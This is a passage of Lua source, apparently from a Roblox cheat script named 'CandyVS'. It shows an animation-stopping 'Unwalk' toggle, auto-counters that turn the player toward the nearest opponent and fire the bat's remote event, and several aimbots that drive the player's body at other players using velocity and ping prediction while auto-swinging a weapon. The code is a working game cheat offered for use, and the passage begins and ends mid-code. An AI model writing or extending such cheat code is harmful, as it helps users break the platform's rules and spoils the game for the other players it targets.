		if not toggleStates["Unwalk"] or character ~= Player.Character then return end
		local generation = unwalkState.generation
		local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
		local animate = character:FindFirstChild("Animate") or character:WaitForChild("Animate", 5)
		if not humanoid or not animate or generation ~= unwalkState.generation or not toggleStates["Unwalk"] then return end
		unwalkState.animate = animate
		unwalkState.disabledByUs = (previousAnimate == animate and previouslyDisabledByUs)
			or (animate:IsA("LocalScript") and not animate.Disabled)
		if animate:IsA("LocalScript") then animate.Disabled = true end

		local function stopAllTracks()
			if generation ~= unwalkState.generation or not toggleStates["Unwalk"]
				or character ~= Player.Character or humanoid.Parent ~= character then return end
			for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do
				pcall(function() track:Stop(0) end)
			end
		end

		unwalkState.animationConn = humanoid.AnimationPlayed:Connect(function(track)
			if generation ~= unwalkState.generation or not toggleStates["Unwalk"] then return end
			pcall(function() track:Stop(0) end)
		end)
		stopAllTracks()
	end

	FeaturePostToggle["Unwalk"] = function(active)
		if active then
			applyUnwalk(Player.Character)
		else
			disconnectUnwalk()
			resumeAnimations(false)
		end
	end
	_G.__CandyVSTrackStopper(function()
		disconnectUnwalk()
		resumeAnimations(true)
	end)
	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(character)
		if not toggleStates["Unwalk"] then return end
		task.defer(function() applyUnwalk(character) end)
	end))
	if toggleStates["Unwalk"] then
		task.defer(function() applyUnwalk(Player.Character) end)
	end
	end

	do
	local counterConn  = nil
	local wasRagdolled = false

	local function getBat()
	local char = Player.Character
	if not char then return nil end
	local equipped = char:FindFirstChildOfClass("Tool")
	if equipped and equipped.Name:lower():find("bat") then return equipped end
	local bp = Player:FindFirstChild("Backpack")
	if bp then
	local hum = char:FindFirstChildOfClass("Humanoid")
	for _, t in ipairs(bp:GetChildren()) do
	if t:IsA("Tool") and t.Name:lower():find("bat") then
	if hum then pcall(function() hum:EquipTool(t) end) end
	return char:FindFirstChild(t.Name) or t
	end
	end
	end
	return nil
	end

	local function getClosest(hrp)
	local best, bestDist = nil, math.huge
	for _, p in ipairs(Players:GetPlayers()) do
	if p ~= Player and p.Character then
	local r = p.Character:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = p.Character:FindFirstChildOfClass("Humanoid")
	if r and targetHumanoid and targetHumanoid.Health > 0 then
	local d = (hrp.Position - r.Position).Magnitude
	if d < bestDist then bestDist = d; best = r end
	end
	end
	end
	return best, bestDist
	end

	local function onRagdoll(hrp)
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not char or not hum or not root or hum.Health <= 0 then return end
	local targetRoot, distance = getClosest(root)
	if targetRoot and distance <= 4 then
		local lookPosition = Vector3.new(targetRoot.Position.X, root.Position.Y, targetRoot.Position.Z)
		if (lookPosition - root.Position).Magnitude > 0.01 then
			pcall(function()
				hum.AutoRotate = false
				root.CFrame = CFrame.lookAt(root.Position, lookPosition)
			end)
		end
	end
	local bat = getBat()
	if bat then
	pcall(function() bat:Activate() end)
	local remote = bat:FindFirstChildWhichIsA("RemoteEvent", true)
	if remote then pcall(function() remote:FireServer() end) end
	end
	task.defer(function()
	if hum.Parent then hum.AutoRotate = true end
	end)
	end

	local function startRagdollCounter()
	if counterConn then return end
	local char = Player.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end

	counterConn = {}

	do
	local ok, con = pcall(function()
	return hum.StateChanged:Connect(function(_, newState)
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	local isRag = (newState == Enum.HumanoidStateType.Physics or newState == Enum.HumanoidStateType.Ragdoll or newState == Enum.HumanoidStateType.FallingDown)
	if isRag and not wasRagdolled then wasRagdolled = true; pcall(function() onRagdoll(hrp) end)
	elseif not isRag and wasRagdolled then wasRagdolled = false end
	end)
	end)
	if ok and con then table.insert(counterConn, con) end
	end

	do
	local ok, con = pcall(function()
	return hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
	if ragdollCounterPaused or not toggleStates["Ragdoll Counter"] then return end
	if hum.PlatformStand and not wasRagdolled then
	wasRagdolled = true
	pcall(function() onRagdoll(hrp) end)
	elseif not hum.PlatformStand then
	wasRagdolled = false
	end
	end)
	end)
	if ok and con then table.insert(counterConn, con) end
	end
	end

	local function stopRagdollCounter()
	if counterConn then
	for _, c in ipairs(counterConn) do pcall(function() c:Disconnect() end) end
	counterConn = nil
	end
	wasRagdolled = false
	end

	FeaturePostToggle["Ragdoll Counter"] = function(active)
	if active then startRagdollCounter() else stopRagdollCounter() end
	end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function()
	task.wait(0.5); wasRagdolled = false
	if toggleStates["Ragdoll Counter"] then
	stopRagdollCounter()
	startRagdollCounter()
	end
	end))

	if toggleStates["Ragdoll Counter"] then startRagdollCounter() end
	end

	do
	local MEDUSA_COOLDOWN = 25
	local medusaDebounce = false
	local medusaLastUsed = 0
	local medusaCounterEnabled = false
	local medusaConns = {}

	local function findMedusa()
	local char = Player.Character
	if not char then return nil end
	for _, t in ipairs(char:GetChildren()) do
	if t:IsA("Tool") and (t.Name:lower():find("medusa") or t.Name:lower():find("head") or t.Name:lower():find("stone")) then
	return t
	end
	end
	local bp = Player:FindFirstChild("Backpack")
	if bp then
	for _, t in ipairs(bp:GetChildren()) do
	if t:IsA("Tool") and (t.Name:lower():find("medusa") or t.Name:lower():find("head") or t.Name:lower():find("stone")) then
	return t
	end
	end
	end
	return nil
	end

	local function useMedusa()
	if not medusaCounterEnabled then return end
	if medusaDebounce then return end
	if tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
	local char = Player.Character
	if not char then return end
	medusaDebounce = true
	local med = findMedusa()
	if not med then
	medusaDebounce = false
	return
	end
	if med.Parent ~= char then
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then pcall(function() hum:EquipTool(med) end) end
	task.wait(0.05)
	end
	pcall(function() med:Activate() end)
	medusaLastUsed = tick()
	medusaDebounce = false
	end

	local function onAnchorChanged(part)
	return part:GetPropertyChangedSignal("Anchored"):Connect(function()
	if medusaCounterEnabled and part.Anchored and part.Transparency == 1 then
	useMedusa()
	end
	end)
	end

	local function setupMedusa(char)
	for _, c in pairs(medusaConns) do
	pcall(function() c:Disconnect() end)
	end
	medusaConns = {}
	if not char then return end
	for _, part in ipairs(char:GetDescendants()) do
	if part:IsA("BasePart") then
	table.insert(medusaConns, onAnchorChanged(part))
	end
	end
	table.insert(medusaConns, char.DescendantAdded:Connect(function(part)
	if part:IsA("BasePart") then
	table.insert(medusaConns, onAnchorChanged(part))
	end
	end))
	end

	local function startMedusaCounter()
	medusaCounterEnabled = true
	if Player.Character then
	setupMedusa(Player.Character)
	end
	end

local function stopMedusaCounter()
	medusaCounterEnabled = false
	for _, c in pairs(medusaConns) do
	pcall(function() c:Disconnect() end)
	end
medusaConns = {}
end
_G.__CandyVSTrackStopper(stopMedusaCounter)
FeaturePostToggle["Medusa Counter"] = function(active)
if active then startMedusaCounter() else stopMedusaCounter() end
end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(newChar)
	task.wait(0.5)
	if medusaCounterEnabled then
	setupMedusa(newChar)
	end
	end))

if toggleStates["Medusa Counter"] then
	startMedusaCounter()
	end
	end

	do
	local LP = Player

	local function getBat()
	local char = LP.Character
	if char then
	local equippedTool = char:FindFirstChildOfClass("Tool")
	if equippedTool then
	local equippedName = equippedTool.Name:lower()
	if equippedName:find("bat", 1, true) or equippedName:find("slap", 1, true) then
	return equippedTool
	end
	end
	local backpack = LP:FindFirstChildOfClass("Backpack")
	if backpack then
	for _, tool in ipairs(backpack:GetChildren()) do
	if tool:IsA("Tool") then
	local toolName = tool.Name:lower()
	if toolName:find("bat", 1, true) or toolName:find("slap", 1, true) then
	return tool
	end
	end
	end
	end
	end
	return nil
	end

	local _cypherConn = nil

	_G.__CandyVSAceNormalAimbot = _G.__CandyVSAceNormalAimbot or {
	target = nil,
	swingCooldown = false,
	nextSwingAt = 0,
	}
	local function getEnemyRenderCFrame(root)
	if not root then return nil end
	local rendered = root.CFrame
	local ok, current = pcall(root.GetRenderCFrame, root)
	if ok and current then rendered = current end
	return rendered
	end

	_cypherStartFollowing = function(char)
	char = char or Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not root then return end
	if _cypherConn then _cypherConn:Disconnect(); _cypherConn = nil end
	_G.__CandyVSAceNormalAimbot.nextSwingAt = 0
	_G.__CandyVSAceNormalAimbot.swingCooldown = false
	humanoid.AutoRotate = false
	local initialBat = char:FindFirstChildOfClass("Tool") or getBat()
	if initialBat and initialBat.Parent ~= char then
	pcall(humanoid.EquipTool, humanoid, initialBat)
	end

	_cypherConn = RunService.RenderStepped:Connect((function()
	if not toggleStates["Aimbot"] then return end
	local currentChar = Player.Character
	if not currentChar then return end
	local currentRoot = currentChar:FindFirstChild("HumanoidRootPart")
	local currentHumanoid = currentChar:FindFirstChildOfClass("Humanoid")
	if not currentRoot or not currentHumanoid then return end
	if currentHumanoid.AutoRotate then currentHumanoid.AutoRotate = false end

	local bat = currentChar:FindFirstChildOfClass("Tool") or getBat()
	if bat and bat.Parent ~= currentChar then
	pcall(currentHumanoid.EquipTool, currentHumanoid, bat)
	end

	local markerCFrame = nil
	if _G.__CandyVSTPBatGetMarkerCFrame then
	local ok, result = pcall(_G.__CandyVSTPBatGetMarkerCFrame)
	if ok then markerCFrame = result end
	end
	local visualTarget = nil
	local visualTargetCFrame = nil
	local visualEnemy = _G.__CandyVSGetVisualEnemy and _G.__CandyVSGetVisualEnemy()
	if visualEnemy and visualEnemy ~= Player and visualEnemy.Character then
	local visualRoot = visualEnemy.Character:FindFirstChild("HumanoidRootPart")
	local visualHumanoid = visualEnemy.Character:FindFirstChildOfClass("Humanoid")
	if visualRoot and visualHumanoid and visualHumanoid.Health > 0 then
	visualTarget = visualRoot
	visualTargetCFrame = getEnemyRenderCFrame(visualRoot)
	end
	end
	if not markerCFrame and (not visualTarget or not visualTargetCFrame) then return end
	_G.__CandyVSAceNormalAimbot.target = markerCFrame or visualTarget

	local myPosition = currentRoot.Position
	local targetCFrame = markerCFrame or visualTargetCFrame
	local targetPosition = targetCFrame.Position
	local predictedChase = targetPosition
	local direction = predictedChase - myPosition
	local flatDirection = Vector3.new(direction.X, 0, direction.Z)

	local chaseSpeed = toggleStates["Lagger Aimbot"] and 34 or (selectedMode == "Lagger" and 40 or 60)
	local horizontalVelocity = Vector3.zero
	if flatDirection.Magnitude >= 0.01 then
	horizontalVelocity = flatDirection.Unit * chaseSpeed
	end
	local verticalVelocity = (targetPosition.Y - myPosition.Y) * 19.5
	verticalVelocity = math.clamp(verticalVelocity, -70, 110)
	local desiredVelocity = Vector3.new(
	horizontalVelocity.X,
	verticalVelocity,
	horizontalVelocity.Z
	)
	currentRoot.AssemblyLinearVelocity = desiredVelocity

	local predictedPosition = targetPosition
	if (predictedPosition - myPosition).Magnitude > 0.1 then
	local goalCFrame = CFrame.lookAt(myPosition, predictedPosition)
	local difference = currentRoot.CFrame:Inverse() * goalCFrame
	local rx, ry, rz = difference:ToEulerAnglesXYZ()
	rx = math.clamp(rx, -2.5, 2.5)
	ry = math.clamp(ry, -2.5, 2.5)
	rz = math.clamp(rz, -2.5, 2.5)
	currentRoot.AssemblyAngularVelocity = currentRoot.CFrame:VectorToWorldSpace(
	Vector3.new(rx * 42, ry * 42, rz * 42)
	)
	end

	local swingNow = tick()
	if bat and swingNow >= (_G.__CandyVSAceNormalAimbot.nextSwingAt or 0) then
	_G.__CandyVSAceNormalAimbot.nextSwingAt = swingNow + 0.08
	pcall(bat.Activate, bat)
	end
	end))
	end

	_cypherStop = function()
	if _cypherConn then _cypherConn:Disconnect(); _cypherConn = nil end
	if _G.__CandyVSAceNormalAimbot then
	_G.__CandyVSAceNormalAimbot.target = nil
	_G.__CandyVSAceNormalAimbot.swingCooldown = false
	_G.__CandyVSAceNormalAimbot.nextSwingAt = 0
	end
	local char = Player.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if root then
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	end
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if humanoid then humanoid.AutoRotate = true end
	end

	_G.__CandyVSTrackConn(Player.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	if toggleStates["Aimbot"] then _cypherStartFollowing(char) end
	end))

	
	
	do
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local Player = Players.LocalPlayer
	local _v2Conn = nil
	local _v2PrevAutoRotate = nil
	local _v2Enabled = false

	local function v2FindBat()
		local char = Player.Character
		if not char then return nil end
		local names = { "Bat", "Slap", "SlapHand", "Hand", "ClassicBat", "BatTool" }
		for _, name in ipairs(names) do
			local t = char:FindFirstChild(name)
			if t and t:IsA("Tool") then return t end
		end
		local bp = Player:FindFirstChildOfClass("Backpack")
		if bp then
			for _, name in ipairs(names) do
				local t = bp:FindFirstChild(name)
				if t and t:IsA("Tool") then return t end
			end
			for _, ch in ipairs(bp:GetChildren()) do
				if ch:IsA("Tool") then
					local n = string.lower(ch.Name)
					if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then
						return ch
					end
				end
			end
		end
		for _, ch in ipairs(char:GetChildren()) do
			if ch:IsA("Tool") then
				local n = string.lower(ch.Name)
				if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then
					return ch
				end
			end
		end
		return nil
	end

	local function v2IsBatTool(tool)
		if not tool then return false end
		local n = string.lower(tool.Name)
		return string.find(n, "bat", 1, true) ~= nil or string.find(n, "slap", 1, true) ~= nil
	end

	local function v2GetClosestTarget()
		local char = Player.Character
		if not char then return nil end
		local root = char:FindFirstChild("HumanoidRootPart")
		if not root then return nil end
		local rpos = root.Position
		local closest, minDist = nil, math.huge
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= Player then
				local c = plr.Character
				if c then
					local tRoot = c:FindFirstChild("HumanoidRootPart")
					local hum = c:FindFirstChildOfClass("Humanoid")
					if tRoot and hum and hum.Health > 0 then
						local d = (tRoot.Position - rpos).Magnitude
						if d < minDist then
							minDist = d
							closest = tRoot
						end
					end
				end
			end
		end
		return closest
	end

	local function v2TrySwing()
		pcall(function()
			local char = Player.Character
			if not char then return end
			local currentTool = char:FindFirstChildOfClass("Tool")
			if currentTool and not v2IsBatTool(currentTool) then return end
			local bat = v2FindBat()
			if not bat then return end
			if bat.Parent ~= char then
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(bat) end) end
			end
			pcall(function() bat:Activate() end)
		end)
	end

	local function v2Stop()
		_v2Enabled = false
		if _v2Conn then
			pcall(function() _v2Conn:Disconnect() end)
			_v2Conn = nil
		end
		local char = Player.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		local hum = char and char:FindFirstChildOfClass("Humanoid")
		if hum then
			hum.AutoRotate = (_v2PrevAutoRotate == nil) and true or _v2PrevAutoRotate
			hum.PlatformStand = false
			pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
		end
		if root then
			root.AssemblyLinearVelocity = Vector3.new(0, -0.1, 0)
			root.AssemblyAngularVelocity = Vector3.zero
		end
		_v2PrevAutoRotate = nil
	end

	local function v2Start()
		if _v2Conn then return end
		_v2Enabled = true
		local hum0 = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
		if hum0 then
			if _v2PrevAutoRotate == nil then _v2PrevAutoRotate = hum0.AutoRotate end
			hum0.AutoRotate = false
		end
		_v2Conn = RunService.RenderStepped:Connect(function()
			if not _v2Enabled then return end
			if tonumber(_G.__batAimbotVersion) ~= 2 then return end
			if not (toggleStates and toggleStates["Aimbot"]) then return end
			local char = Player.Character
			if not char then return end
			local root = char:FindFirstChild("HumanoidRootPart")
			local hum = char:FindFirstChildOfClass("Humanoid")
			if not root or not hum then return end
			if not char:FindFirstChildOfClass("Tool") then
				local bat = v2FindBat()
				if bat then pcall(function() hum:EquipTool(bat) end) end
			end
			local target = v2GetClosestTarget()
			if not target then return end
			local speed = 58
			pcall(function()
				if speedValues and tonumber(speedValues.CypherAimbotApproachSpeed) then
					speed = math.clamp(tonumber(speedValues.CypherAimbotApproachSpeed), 1, 120)
				end
			end)
			local targetVel = target.AssemblyLinearVelocity
			local myPos = root.Position
			local targetPos = target.Position
			local predictPos = targetPos + targetVel * 0.14
			predictPos = predictPos + target.CFrame.LookVector * 0.3
			local direction = predictPos - myPos
			local flatDir = Vector3.new(direction.X, 0, direction.Z)
			if flatDir.Magnitude > 0 then
				flatDir = flatDir.Unit
			else
				flatDir = Vector3.new(0, 0, 0)
			end
			local desiredHeight = targetPos.Y + 3.7
			local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
			if hum.FloorMaterial ~= Enum.Material.Air then
				yVel = math.max(yVel, 13)
			end
			yVel = math.clamp(yVel, -70, 110)
			local desiredVel = Vector3.new(flatDir.X * speed, yVel, flatDir.Z * speed)
			root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
			local speed3 = targetVel.Magnitude
			local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
			local predictedPos = targetPos + targetVel * predictTime
			local toPredict = predictedPos - myPos
			if toPredict.Magnitude > 0.1 then
				local goalCF = CFrame.lookAt(myPos, predictedPos)
				local diffCF = root.CFrame:Inverse() * goalCF
				local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
				rx = math.clamp(rx, -2.5, 2.5)
				ry = math.clamp(ry, -2.5, 2.5)
				rz = math.clamp(rz, -2.5, 2.5)
				root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
			end
			local distToTarget = (root.Position - target.Position).Magnitude
			if distToTarget <= 8 then
				v2TrySwing()
			end
		end)
	end

	_G.__CandyVSBatAimbotV2 = function(active)
		if active then
			v2Start()
		else
			v2Stop()
		end
	end
	_G.__CandyVSStopBatAimbotV2 = v2Stop
	end

	local _batAimbotPostToggleV1 = nil
	local function routeBatAimbotPostToggle(active)
		local ver = tonumber(_G.__batAimbotVersion) == 2 and 2 or 1
		if ver == 2 then
			if type(_G.__CandyVSBatAimbotV2) == "function" then
				pcall(_G.__CandyVSBatAimbotV2, active == true)
			elseif active then
				warn("[CandyVS] Bat Aimbot V2 is selected but not installed yet.")
			end
			return
		end
		if _batAimbotPostToggleV1 then
			pcall(_batAimbotPostToggleV1, active == true)
		end
	end
FeaturePostToggle["Aimbot"] = function(active)
	if active then
	if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end
	if autoplayActive or toggleStates["Autoplay"] then
	_G.__stopAutoplay()
	end
	deactivateOtherAimbots("Aimbot")
	if _G.__deactivateBatExclusive then _G.__deactivateBatExclusive("Aimbot") end
	_G.__checkAndAutoDrop(function()
	local char = Player.Character
	if char then _cypherStartFollowing(char) end
	end)
	else
	_cypherStop()
	if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end
	end
	end

	do
	pcall(function()
	local oldSphere = workspace:FindFirstChild("PredictionSphere")
	if oldSphere then oldSphere:Destroy() end
	end)
	local Z = {
	targetPlayer = nil,
	lastTargetPos = nil,
	targetVelocity = Vector3.zero,
	smoothedVelocity = Vector3.zero,
	velocityHistory = {},
	accelerationHistory = {},
	aerialVelocityHistory = {},
	verticalVelocityHistory = {},
	previousDirection = nil,
	lastDirectionChangeTime = 0,
	airborneTime = 0,
	lastYVelocity = 0,
	lastJumpTime = 0,
	lastActivationTime = 0,
	currentPing = 0.1,
	realPingMs = 0,
	}
	local ZCFG = {
	FOLLOW_SPEED = 60,
	ACTIVATE_DISTANCE = 13,
	MIN_FOLLOW_DISTANCE = 1,
	PREDICTION_TIME = 0.22,
	PREDICT_AHEAD = 3,
	MAX_VELOCITY_CHANGE = 150,
	VELOCITY_SMOOTHING = 0.2,
	MAX_HORIZONTAL_VELOCITY = 80,
	SERVER_TICKRATE = 1 / 60,
	MIN_PING_COMPENSATION = 0.03,
	MAX_PING_COMPENSATION = 0.25,
	ACCELERATION_PREDICTION_WEIGHT = 0.3,
	DIRECTION_CHANGE_DETECTION_TIME = 0.12,
	QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
	GRAVITY = 196.2,
	AIR_CONTROL_FACTOR = 0.8,
	AERIAL_VELOCITY_DECAY = 0.95,
	MIN_AIRBORNE_TIME = 0.08,
	FALLING_SPEED_THRESHOLD = -15,
	}
	local zurichConn = nil
	local function averageVector(history)
	if #history == 0 then return Vector3.zero end
	local total = Vector3.zero
	for _, value in ipairs(history) do total = total + value end
	return total / #history
	end
	local function pushHistory(history, value, maximum)
	table.insert(history, value)
	if #history > maximum then table.remove(history, 1) end
	end
	local function resetZurichTarget()
	Z.targetPlayer = nil
	Z.lastTargetPos = nil
	Z.targetVelocity = Vector3.zero
	Z.smoothedVelocity = Vector3.zero
	Z.velocityHistory = {}
	Z.accelerationHistory = {}
	Z.aerialVelocityHistory = {}
	Z.verticalVelocityHistory = {}
	Z.previousDirection = nil
	Z.airborneTime = 0
	Z.lastYVelocity = 0
	end
	local function nearestZurichTarget(root)
	local nearest, nearestDistance = nil, math.huge
	for _, candidate in ipairs(Players:GetPlayers()) do
	if candidate ~= Player and candidate.Character then
	local targetRoot = candidate.Character:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = candidate.Character:FindFirstChildOfClass("Humanoid")
	if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
	local distance = (root.Position - targetRoot.Position).Magnitude
	if distance < nearestDistance then nearest, nearestDistance = candidate, distance end
	end
	end
	end
	return nearest
	end
	local function rotateZurichRoot(root, direction)
	if direction.Magnitude < 0.01 then return end
	local axis = root.CFrame.LookVector:Cross(direction.Unit)
	local angle = math.asin(math.clamp(axis.Magnitude, -1, 1))
	root.AssemblyAngularVelocity = axis.Magnitude > 0.01 and axis.Unit * angle * 80 or Vector3.zero
	end
	local function sampleZurichPing()
	local ok, value = pcall(function()
	return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	if ok and type(value) == "number" then Z.realPingMs = math.floor(value) end
	Z.currentPing = math.clamp(Z.realPingMs / 1000, ZCFG.MIN_PING_COMPENSATION, ZCFG.MAX_PING_COMPENSATION)
	end
	task.spawn(function()
	while _G.__CANDYVS_STATE == candyvsRuntimeState do
	pcall(sampleZurichPing)
	task.wait(0.5)
	end
	end)

	local function stopZurichAimbot()
	if zurichConn then zurichConn:Disconnect(); zurichConn = nil end
	local char = Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if humanoid then humanoid.AutoRotate = true end
	if root then root.AssemblyAngularVelocity = Vector3.zero end
	resetZurichTarget()
	Z.lastActivationTime = 0
	end

	local function startZurichAimbot(char)
	char = char or Player.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not root then return end
	stopZurichAimbot()
	humanoid.AutoRotate = false
	local bat = getBat()
	if bat and bat.Parent ~= char then pcall(humanoid.EquipTool, humanoid, bat) end
	zurichConn = RunService.RenderStepped:Connect(function(dt)
	if not toggleStates["Aimbot"] then stopZurichAimbot(); return end
	local currentChar = Player.Character
	local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
	local currentHumanoid = currentChar and currentChar:FindFirstChildOfClass("Humanoid")
	if not currentRoot or not currentHumanoid or currentHumanoid.Health <= 0 then return end
	currentHumanoid.AutoRotate = false
	root, humanoid = currentRoot, currentHumanoid
	bat = currentChar:FindFirstChildOfClass("Tool") or getBat()
	if bat and bat.Parent ~= currentChar then pcall(currentHumanoid.EquipTool, currentHumanoid, bat) end

	local markerCFrame = nil
	if _G.__CandyVSTPBatGetMarkerCFrame then
	local ok, result = pcall(_G.__CandyVSTPBatGetMarkerCFrame)
	if ok then markerCFrame = result end
	end
	if markerCFrame then
	local markedDirection = markerCFrame.Position - root.Position
	if markedDirection.Magnitude > 0.1 then rotateZurichRoot(root, markedDirection) end
	if markedDirection.Magnitude > ZCFG.MIN_FOLLOW_DISTANCE then
	local markedSpeed = tonumber(speedValues.CypherAimbotApproachSpeed) or ZCFG.FOLLOW_SPEED
	root.AssemblyLinearVelocity = markedDirection.Unit * math.clamp(markedSpeed, 1, 120)
	else
	root.AssemblyLinearVelocity = Vector3.zero
	end
	return
	end

	Z.targetPlayer = nearestZurichTarget(root)
	local targetChar = Z.targetPlayer and Z.targetPlayer.Character
	local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
	local targetHumanoid = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
	if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then resetZurichTarget(); return end
	local targetPos = targetRoot.Position
	local safeDt = math.max(dt, 1 / 240)
	if Z.lastTargetPos then
	local rawVelocity = (targetPos - Z.lastTargetPos) / safeDt
	local velocityDelta = rawVelocity - Z.targetVelocity
	if velocityDelta.Magnitude > ZCFG.MAX_VELOCITY_CHANGE then
	rawVelocity = Z.targetVelocity + velocityDelta.Unit * ZCFG.MAX_VELOCITY_CHANGE
	end
	local horizontal = Vector3.new(rawVelocity.X, 0, rawVelocity.Z)
	if horizontal.Magnitude > ZCFG.MAX_HORIZONTAL_VELOCITY then
	horizontal = horizontal.Unit * ZCFG.MAX_HORIZONTAL_VELOCITY
	rawVelocity = Vector3.new(horizontal.X, rawVelocity.Y, horizontal.Z)
	end
	pushHistory(Z.accelerationHistory, (rawVelocity - Z.targetVelocity) / safeDt, 4)
	pushHistory(Z.velocityHistory, rawVelocity, 8)
	pushHistory(Z.verticalVelocityHistory, rawVelocity.Y, 5)
	Z.targetVelocity = rawVelocity
	Z.smoothedVelocity = Z.smoothedVelocity:Lerp(rawVelocity, ZCFG.VELOCITY_SMOOTHING)
	end
	Z.lastTargetPos = targetPos

	local airborne = targetHumanoid.FloorMaterial == Enum.Material.Air
	Z.airborneTime = airborne and (Z.airborneTime + safeDt) or 0
	if airborne and Z.airborneTime >= ZCFG.MIN_AIRBORNE_TIME then
	pushHistory(Z.aerialVelocityHistory, Z.targetVelocity, 6)
	elseif not airborne then
	Z.aerialVelocityHistory = {}
	end
	local predictionVelocity = Z.smoothedVelocity
	if airborne and #Z.aerialVelocityHistory > 0 then
	local aerial = averageVector(Z.aerialVelocityHistory)
	predictionVelocity = Vector3.new(aerial.X, Z.targetVelocity.Y, aerial.Z) * ZCFG.AIR_CONTROL_FACTOR
	end
	local quickTurn = false
	local horizontalVelocity = Vector3.new(Z.targetVelocity.X, 0, Z.targetVelocity.Z)
	if horizontalVelocity.Magnitude > 5 then
	local direction = horizontalVelocity.Unit
	if Z.previousDirection and Z.previousDirection:Dot(direction) < 0.5 then
	quickTurn = tick() - Z.lastDirectionChangeTime < ZCFG.DIRECTION_CHANGE_DETECTION_TIME
	Z.lastDirectionChangeTime = tick()
	end
	Z.previousDirection = direction
	end
	local serverDelay = Z.currentPing + ZCFG.SERVER_TICKRATE
	if quickTurn then serverDelay = serverDelay * ZCFG.QUICK_DIRECTION_CHANGE_MULTIPLIER end
	local predicted = targetPos + predictionVelocity * serverDelay
	local acceleration = averageVector(Z.accelerationHistory)
	predicted = predicted + acceleration * ZCFG.ACCELERATION_PREDICTION_WEIGHT * (serverDelay * serverDelay * 0.5)
	local predictionTime = ZCFG.PREDICTION_TIME * 1.1
	if airborne then
	predicted = predicted + predictionVelocity * predictionTime
	predicted = predicted + Vector3.new(0, -0.5 * ZCFG.GRAVITY * predictionTime * predictionTime, 0)
	else
	predicted = predicted + predictionVelocity * predictionTime
	end
	local flatPrediction = Vector3.new(predictionVelocity.X, 0, predictionVelocity.Z)
	if flatPrediction.Magnitude > 1 then predicted = predicted + flatPrediction.Unit * ZCFG.PREDICT_AHEAD end
	local toTarget = predicted - root.Position
	rotateZurichRoot(root, toTarget)
	if (targetPos - root.Position).Magnitude <= ZCFG.ACTIVATE_DISTANCE and tick() - Z.lastActivationTime >= 0.3 then
	if bat then pcall(bat.Activate, bat) end
	Z.lastActivationTime = tick()
	end
	if toTarget.Magnitude > ZCFG.MIN_FOLLOW_DISTANCE then
	local speed = math.clamp(tonumber(speedValues.CypherAimbotApproachSpeed) or ZCFG.FOLLOW_SPEED, 1, 120)
	root.AssemblyLinearVelocity = toTarget.Unit * speed
	else
	root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y * 0.5, 0)
	end
	end)
	end

	_cypherStartFollowing = startZurichAimbot
	_cypherStop = stopZurichAimbot
	FeaturePostToggle["Aimbot"] = function(active)
	if active then
	if _G.__stopSpeedBoost then _G.__stopSpeedBoost() end
	if autoplayActive or toggleStates["Autoplay"] then _G.__stopAutoplay() end
	deactivateOtherAimbots("Aimbot")
	if _G.__deactivateBatExclusive then _G.__deactivateBatExclusive("Aimbot") end
	_G.__checkAndAutoDrop(function() startZurichAimbot(Player.Character) end)
	else
	stopZurichAimbot()
	if _G.__refreshSpeedBoost then _G.__refreshSpeedBoost() end
	end
	end
	_G.__CandyVSTrackStopper(stopZurichAimbot)
	end

	FeaturePostToggle["Lagger Aimbot"] = function(active)
	if active then
	_G.__CandyVSLaggerAimbotPreviousMode = selectedMode
	_G.__CandyVSLaggerAimbotPreviousAimbot = toggleStates["Aimbot"] == true
